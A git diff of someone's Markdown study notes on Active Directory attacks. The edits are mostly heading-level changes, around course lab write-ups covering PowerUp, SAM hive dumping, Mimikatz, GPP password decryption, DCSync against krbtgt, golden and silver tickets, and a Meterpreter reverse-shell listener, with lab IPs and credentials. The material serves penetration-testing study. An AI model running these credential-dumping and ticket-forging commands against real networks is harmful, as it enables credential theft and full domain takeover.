@@ -1,4 +1,4 @@
-## Introduction to Active Directory
+# Introduction to Active Directory
 * **AD** is Microsoft's directory service for managing authentication, authorization, and access to Windows domain networks. It acts as a single point of control for admins to manage users, computers, and other devices.
   * Main objective of attacking AD is to gain **Domain Admin** (DA) access to a **Domain Controller** (DC).
 * **Domain Controller** is the center of the network domain and is responsible for all interactions concerning the domain, including user logins, resources access, and more.
@@ -7,7 +7,7 @@
   * Gaining access to the DC via DA credentials gives you ultimate control over an entire network domain. It facilitates moving through a network and performing administrative tasks unrestricted to exploit the system while appearing as a legitimate user.
 <div align="center"><img width="551" height="516" alt="image" src="https://github.com/user-attachments/assets/97552527-d8aa-4aa6-b158-bd044d07af72" /></div>
 
-## Introduction to Active Directory Attacks Overview
+## Active Directory Attacks Overview
 ### Password Attacks
 * After gaining initial access to a Windows system, local and domain plaintext or hashed passwords on your target can be the key to privilege escalation and lateral movement.
   * Local passwords can be stored in various locations, such as in files and folders, and in the Windows registry, such as the SAM, SYSTEM, and SECURITY registry hives. The Local Security Authority Subsystem (LSASS) is a common place to find either local or domain passwords, but you can also find domain passwords within a Group Policy Preference (GPP).
@@ -67,16 +67,16 @@
 ### SharpHound
 * SharpHound is BloodHound's data collector counterpart and is used to ingest data from the AD environments, which can then be analyzed in BloodHound. SharpHound enumerates the AD environment, collecting valuable information about users, groups, group memberships, organizational units, permissions, and more. The data is then processed by BloodHound, which graphically represents the complex relationships within the system.
 
-## Local Passwords
+# Local Passwords
 * When landing on a Windows system as a result of initial access, your next steps will involve some sort of privilege escalation or lateral movement. Often, both of these techniques will rely on harvesting passwords from your target environment to accomplish this.
 * Passwords can be found on your target host in various locations, including common places, such as the Windows registry, and uncommon places such as files and folders, the Security Account Manager (SAM), SYSTEM, SECURITY, and LSASS.
 
-### Common Places
+## Common Places
 * **PowerUp**: Common local escalation tool is PowerUp.ps1 which searches for passwords in common places, including the Windows registry and unattended files. To use PowerUp, you'll first need to transfer it onto the target host and import the module in PS with `Import-Module .\PowerUp.ps1`. You can then execute it with `Invoke-AllChecks`. PowerUp will then search for the host for any passwords.
    * One specific location PowerUp checks is the registry. For example, it queries the following key to check for autologon credentials: `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CUrrentversion\Winlogon`. Without PowerUp, you can check this manually by running the following command from a terminal: `reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon"`.
    * Another place where PowerUp will check for is an adminstrator pass in either of these two paths: `C:\Windows\Panter\Unattend.xml` and `C:\Windows\Panther\Unattend\Unattend.xml`. In large scale deployments, unattended installations of Windows operating systems are necessary. System admins can set up admin passwords in these files. If improperly cleaned up at the end of installation, they can provide malicious users with the means to gain admin privileges over the target host.
 
-#### Offensive PowerShell: Privilege Escalation with PowerUp
+### Offensive PowerShell: Privilege Escalation with PowerUp
 * PowerUp is a PowerShell tool which is a part of the PowerSploit framework, a set of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. More can be found at the [GitHub](https://github.com/PowerShellMafia/PowerSploit).
 * PowerUp automates the enumeration process and carries out checks mainly targeted at identifying common misconfigurations that could allow privilege escalation. Here are some techniques employed by PowerUp:
   * **Sevice enumeration**: Identifies user-configurable services that could be exploited for privilege escalation.
@@ -91,7 +91,7 @@
   * **Cached GPP password**: Checks for any cached GPP passwords.
   * **Named pipe impersonation**: Checks for named pipe client impersonation opportunity, which can be leveraged to escalate privileges. 
 
-##### Functions
+#### Functions
 * If you're concerned about the noise generated by `Invoke-AllChecks` or you want to focus in on something, you can use the following:
   * **Service Enumeration**:
     * `Get-UnquotedService`: returns services with unquoted paths with a space in the name.
@@ -129,7 +129,7 @@
         * `Write-UserAddMSI`: writes out an MSI installer that prompts for a user to be added.
         * `Invoke-AllChecks`: runs all current enumeration checks and returns a report. 
 
-##### LAB: Introduction to PowerUp.ps1
+#### LAB: Introduction to PowerUp.ps1
 * **Task 1**: `Import-Module .\PowerUp.Ps1`
 * **Task 2**: `Invoke-AllChecks` is the PowerUp function which performs all enumeration checks on a target system.
 * **Task 6**: To run as another user, we use `runas /user:user1 powershell`
@@ -138,10 +138,10 @@
 * **Task 11** RDPing into the Desktop box using `xfreerdp` and mapping the drive: `xfreerdp /v:10.102.65.250 /u:user1 /dynamic-resolution +drives /drive:root,/home/kali`
 * **Task 14** To start a listener, `msfconsole` --> `use exploit/multi/handler` --> `set PAYLOAD windows/x64/meterpreter/reverse_tcp` --> `set LHOST 10.102.122.194` --> `set LPORT 4444` --> `run`. I was stupid and renamed my exploit from Temp at first, and it didn't work, and then I realized it's Temp because of `Temp Folder`. 
 
-### Uncommon Places
+## Uncommon Places
 * While PowerUp's automated checks search for cleartext passwords, it doesn't look everywhere. Keep in mind that people often leave credentials in files. Manually browsing every folder and reading each file is time-consuming, but PowerShell offers a handy alternative. For example, the following command recursively searches the whole C:\ drive for a specific keyword in the file name: `Get-ChildItem -Path "C:\" -Recurse -Filter "*keyword*" -ErrorAction SilentlyContinue -Force`. Alternatively, this command will recursively search for a keyword within all the files in the C:\ drive: `Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "keyword"`. Using these commands, you can search for keywords like `password, pass, username, user, credential, cred, secret, login`.
 
-### SAM, SYSTEM, and SECURITY
+## SAM, SYSTEM, and SECURITY
 * The SAM (Security Account Manager) is a core Windows component that stores user account credentials in hashed formats. Its functionality relies on two other vital registry hives: SYSTEM and SECURITY. Together, they form a crucial trifecta in preservering system security and regulating access control.
   * **SAM**: Stores user accounts and hashed passwords
   * **SYSTEM**: Manages system configuration, including installed hardware and device drivers
@@ -149,7 +149,7 @@
 * These hives can't be accessed directly while the system is operational, requiring backups for offline analysis. Since Windows 2008 R2/Vista, reconstructing the SAM offline requires backups of all three hives. While the SECURITY and SYSTEM hives contian portions of the boot key cruical for decrypting the SAM's password hashes, the SAM hive houses the hashed passwords themselves.
 * These hives can be saved to file and backed up using `reg` command: `reg save HKLM\<HIVE> <backup file>`.
 
-##### Obtaining User Hashes
+#### Obtaining User Hashes
 * If an attacker gains access to a saved copy of SAM, SYSTEM, and SECURITY, it may be possible to obtain the user hashes for accounts on the host. For example, to save the hives, you'd need to run the following commands:
 ```
 reg save HKLM\SAM SAM.bak
@@ -172,7 +172,7 @@ iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:
     *  Accounts with an SID of 5xx are system accounts, while accounts with 1xxx are created by the admin. In this example (`iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::`), iml-user was added by an admin.
     *  You are the most interested in the NTLM hash most oftem, as it allows you to pass it to a system instead of a password. More on this later ...
 
- ### LSASS and Mimikatz
+ ## LSASS and Mimikatz
  * The LSASS (Local Security Authority Subsystem Service) in Windows plays a critical role in managing the system's security policy and handling user logins. However, examining LSASS while Windows is running involves a series of challenges, mostly due to its privileged status and built-in security mechanisms.
  * In contast, using a tool like Mimikatz presents a practical method of accessing and analyzing LSASS data. Mimikatz is a utility designed to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory, particularly from LSASS process.
    * While the system is operational, Mimikatz can effectively access LSASS, even obtaining encrypted data, such as user passwords and access tokens.
@@ -184,12 +184,11 @@ iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:
 * **Task 2**: To search recursively for a credentials file in `C:\Users`, I used `Get-ChildItem -Path "C:\Users" -Recurse -Filter "*cred*" -ErrorAction SilentlyContinue -Force` first, but it said to use both, so I also tried `Get-ChildItem -Path "C:\Users| -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "credential"`. The first returned way cleaner results because it returned PATHS with the keyword, while the second returned instances of that string - a lot of mess!
 * **Tast 3 and onwards**: Pivoted to new Windows host (m.gibbs) via `xfreerdp` with the credentials found using the file from task 2. Then used `reg save HKLM\* *.bak` for the three registries. Once the hives were backed up and transferred to the attacking machine, I did `impacket-secretsdump -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL` which resulted in admin NTLM hash. 
 
-
-## Domain Passwords
+# Domain Passwords
 * Domain passwords often serve as low-hanging fruit for privilege escalation, lateral movement, and other exploitation within a domain. One key area of particular interest are passwords stored within Group Policy Preferences (GPP). GPP, while designed to simplify configuration management across multiple machines, could be vulnerable to password attack and lead to decryption of a plaintext password.
   * If an admin's plaintext password is uncovered, this provides privileges to run tools like Mimikatz to help extract other domain password hashes and further infiltrate the domain.
  
-### Group Policy Preferences (GPP)
+## Group Policy Preferences (GPP)
 * GPP allows domain-joined machines to be configured via a group policy. Admins can use GPP to configure computer and user configuration settings, including managing scheduled tasks, modifying registry settings, mapping network drives, and more.
 * GPP also allows admins to set local account passwords so they can manage access across the domain at the machine level. This makes GPPs potentially vulnerable, as stored passwords could be exploited to gain access to local administrator accounts on domain-joined machines.
 * Group policies for account management are stored on the domain controller in the SYSVOL folder. Sometimes, these files contain simple configurations, such as renaming an existing account, but others may have a "cpassword" field. This field is used to set passwords for local accounts through Group Policy.
@@ -208,10 +207,10 @@ iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:
 * **Get-GPPPassword** is a PowerShell script that retrieves plaintext passwords and other information for accounts pushed through GPPs. It searches the domain controllers for `groups.xml`, `scheduledtasks.xml`, `services.xml`, and `datasources.xml`, and decrypts and returns any password it finds. Import the script after moving it to the machine with `. .\Get-GPPPassword.ps1`. Once imported, run it with `Get-GPPPassword`.
   * Alternatively, if you have a Meterpreter session on a target, you could use the `post/windows/gather/credentials/gpp` Metasploit module to dump GPP credentials. This module will search for cpassword values stored in GPP and decrypt them with the known AES key.
 
-### Mimikatz
+## Mimikatz
 * With your new admin credentials, you'll be able to log in as the adminstrator and run Mimikatz against the target to extract domain users' passwords, hashes, and more.
 
-#### Dumping Passwords
+### Dumping Passwords
 * As you learned in a previous lab, Local Passwords, you can use Mimikatz to dump any logged-in users on the system. As a quick refresh, you first transfer Mimikatz to the target. Next, open Mimikatz as admin and then acquire debug privilege through `privilege::debug`.
 * Dump user sessions with `sekurlsa::logonpasswords`. Any user session credentials will then be displayed in the output. From here, you can log into the domain-joined machine with any found credentials and check the account's level of access. To do this, open command prompt with admin privileges and run `net user <user> /domain`. You can then find out which groups the user is a member of in the **Global Group memberships** field in the returned output, such as example shown below. In that example, j.doe is a member of the Domain Admins group - success!:
 ```
@@ -233,7 +232,7 @@ Last logon                   3/11/2025 4:11:07 PM                               
 Global Group memberships     *Domain Admins        *Domain Users                                                        
 ```
 
-#### DCSync Attack
+### DCSync Attack
 * Domain Admin credentials are high-value targets in any attack. But what if you're after a different account? After you've compromised a Domain Admin you now have domain replication privileges. With these privileges, you can perform a DCSync attack.
 * A **DCSync attack** allows you to impersonate a Domain Controller (DC) and request password hashes from a target DC using Directory Replication Services (DRS) Remote Protocol. Normally, DCs use replication to synchronize with each other to ensure consistency of data across the domain. In this attack, you mimic DC behavior and request other DCs to replicate data - asking for copies of the AD database. This usually results in access to password hashes and potentially other sensitive information, which can then be used for a number of attacks, including **Golden Ticket** and **Pass-the-Hash**.
 * One example of using DCSync is to target the **krbtgt** built-in domain account. This account's main function is to provide tickets to authenticated users, which validates a user to services within the domain. If you can obtain the NTLM password hash for this domain account, you'll be able to forge Kerberos tickets that allow you to authenticate as any user in the domain.
@@ -315,8 +314,8 @@ Primary:WDigest *
 29 f34ghgf88g134dfg0f76g5h062914ch2
 ```
 
-##### LAB: Kerberos: Golden and Silver Tickets
-###### Silver Tickets
+### LAB: Kerberos: Golden and Silver Tickets
+#### Silver Tickets
 * Silver tickets are aimed at service accounts. They allow an attacker to forge a TGS (Ticket-Granting Service) ticket for a specific service under any user account. For example, an MSSQL server only allows users that are part of the MSSQL group to log in. You can forge a silver ticket with this attack and connect to the MSSQL instance to retrieve sensitive data. To forge a silver ticket, you'll need:
   * Domain security identifier (SID)
   * Domain fully qualified domain name (FQDN)
@@ -346,7 +345,7 @@ Primary:WDigest *
   * Perform golden ticket attack and create a TGT for the **Administrator** account. Once you've created your TGT for the Administrator user and loaded it into memory, use **PsExec** with the following syntax to establish a session on the DC: `PsExec64.exe \\dc01.krbtown.local cmd`.
   * **Tasks 4 and 5**: Creating golden ticket with `kerberos::golden /sid:S-1-5-21-2984655098-284417223-3543700247 /domain:krbtown.local /user:Administrator /krbtgt:a299249c93e6091f8667e949a6e08c89`. Assuming ticket with `Rubeus.exe ptt /ticket:ticket.kirbi` and then I used `PsExec64.exe \\dc01.krbtown.local cmd` and then I navigated to the directory. Remember `type` is equivalent of `cat` for Windows.
  
-##### LAB: Active Directory Domain Passwords
+### LAB: Active Directory Domain Passwords
 * You'll need to use Get-GPPPassword to find the plaintext password of a local administrator in GPP. Next, you'll need to use Mimikatz to dump a logged-in Domain Admin's credentials, before using the dumped Domain Admin's credentials to run a DCSync attack against the **ORCHID/krbtgt** account.
 * **Task 1**: `xfreerdp /v:10.102.9.46 /u:m.gibbs /p:jWU9G2Ux#MDxOBrHik /dynamic-resolution +clipboard +drives /drive:share,/home/kali`
 * **Tasks 2 and 3**: `. .\Get-GPPPassword.ps1` and then `Get-GPPPassword`. We found the username `NewAdmin` and the password `PasswordInGPPIsNotSafe`.
